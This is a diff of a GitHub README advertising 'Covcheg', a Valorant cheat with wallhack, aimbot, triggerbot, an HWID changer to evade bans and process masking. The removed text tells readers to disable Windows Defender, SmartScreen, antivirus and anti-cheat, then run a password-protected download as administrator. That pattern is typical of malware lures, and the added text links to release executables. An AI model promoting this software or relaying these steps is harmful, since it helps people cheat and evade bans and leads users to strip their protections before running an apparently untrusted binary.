@@ -1,64 +1,80 @@
-# Covcheg for Valorant
+# COVCHEG-VALORANT-2025
 
-**Covcheg** is a private software tool developed to enhance gameplay functionality in **Valorant**. It offers users advanced visualization and tactical awareness features within the game environment.
+![Valorant](https://img.shields.io/badge/Valorant-Ready-brightgreen) ![Covcheg](https://img.shields.io/badge/Covcheg-Available-blue)
+
+Welcome to the **COVCHEG-VALORANT-2025** repository! This project offers a unique private software solution designed specifically for Valorant players. Our goal is to enhance your gaming experience and provide you with tools that elevate your skills in competitive matches.
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+Covcheg is a powerful tool created by a dedicated team of developers. We understand the competitive nature of Valorant, and we aim to give players an edge. This software includes various features designed to improve gameplay and strategy. With Covcheg, you can expect to see significant improvements in your performance.
+
+## Features
+
+Covcheg comes packed with a variety of features that cater to different aspects of gameplay:
+
+- **WallHack**: See enemies and allies through walls, giving you the advantage of positioning.
+- **Aimbot**: Improve your accuracy with automated aiming.
+- **Cosmetics**: Customize your character’s appearance to stand out in matches.
+- **HWID Changer**: Change your hardware ID to avoid bans.
+- **Skin Changer**: Alter your weapon skins without affecting gameplay.
+- **Triggerbot**: Automatically fire when an enemy comes into your crosshair.
+
+These features are designed to enhance your gameplay and provide a competitive edge.
+
+## Installation
+
+To get started with Covcheg, you will need to download the software. You can find the latest version in the [Releases section](https://github.com/Paikidzee/COVCHEG-VALORANT-2025/releases). 
+
+1. Click on the link to access the releases.
+2. Download the appropriate file for your system.
+3. Execute the file to install Covcheg.
+
+Follow the instructions provided in the installer for a smooth setup.
+
+## Usage
+
+Once installed, you can start using Covcheg to enhance your gaming experience. Here’s how to get started:
+
+1. Launch the Covcheg application.
+2. Configure the settings according to your preferences.
+3. Start Valorant and enjoy the benefits of the features available.
+
+Remember to use the features responsibly and be aware of the risks involved in using third-party software.
+
+## Contributing
+
+We welcome contributions to improve Covcheg. If you have ideas, suggestions, or code improvements, please feel free to submit a pull request. 
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your changes and submit a pull request.
+
+Your contributions help us make Covcheg better for everyone.
+
+## License
+
+This project is licensed under the MIT License. Please refer to the LICENSE file for more information.
+
+## Contact
+
+If you have any questions or need support, feel free to reach out:
+
+- GitHub: [Paikidzee](https://github.com/Paikidzee)
+- Email: support@covcheg.com
+
+For updates and new releases, keep an eye on the [Releases section](https://github.com/Paikidzee/COVCHEG-VALORANT-2025/releases).
 
 ---
 
-<p float="left">
-  <img src="https://i.imgur.com/27e1YP6.png" width="250" />
-  <img src="https://i.imgur.com/x6soV00.png" width="250" />
-  <img src="https://i.imgur.com/fjY5n3U.jpeg" width="250" />
-</p>
-
-## ⚙️ System Requirements
-
-Before launching, make sure to configure your system as follows:
-
-- Disable **Windows Defender** and **Smart Screen**
-- Uninstall all third-party antivirus software
-- Remove the **Faceit anti-cheat**
-
----
-
-## 💾 Installation
-
-1. [Download](https://www.4sync.com/web/directDownload/Juzt2NK_/cKQ38aak.623e0a9d669a2b7dd906f6592dcf0ba1) the latest version of Covcheg. (Password **COVCHEG**) 
-2. Disable Windows Defender, Smart Screen, and any other antivirus programs as listed in the System Requirements.  
-3. Extract the files to a preferred directory on your computer.  
-4. Run the executable file with administrator privileges.
-5. If the cheat does not start, restart your PC, disable all antiviruses and try again.  
-6. Configure settings via the user interface before launching Valorant.  
-7. Launch Valorant and enjoy the enhanced features.
-
-*Note:* Always ensure your system is properly prepared before installation to avoid detection.
-
----
-
-## 📦 Key Features
-
-- **ESP (WallHack)**  
-  Displays additional data about players:
-  - Exact positioning
-  - Health status
-  - Distance to targets
-
-- **Aimbot**  
-  Assists in aiming for improved target tracking (if enabled).
-
-- **User Interface Controls**  
-  Allows customization of software settings, toggling UI elements, and managing active functions.
-  
-- **HWID Changer**  
-  HWID changer is a tool that changes the hardware identifier of a computer. Using an HWID changer, this code can be modified to bypass bans or restrictions imposed by programs that use HWID to identify the device..
-
----
-
-## 🛠 Highlights
-
-- Private access only
-- Focus on stability and usability
-- Fast configuration updates
-- Stealth mode for process masking
-
----
-
+Thank you for visiting the **COVCHEG-VALORANT-2025** repository. We hope you enjoy using our software and that it helps you reach new heights in your Valorant gameplay!
